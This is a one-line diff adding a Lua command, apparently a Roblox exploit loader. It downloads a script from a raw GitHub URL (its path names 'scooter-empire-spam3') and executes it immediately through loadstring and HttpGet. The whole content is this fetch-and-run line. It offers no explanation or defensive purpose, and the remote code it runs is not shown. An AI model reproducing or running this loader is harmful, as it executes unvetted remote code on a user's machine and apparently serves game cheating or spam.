@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/scooter-empire-spam3-aj5yki5mm6m7o2.lua"))()
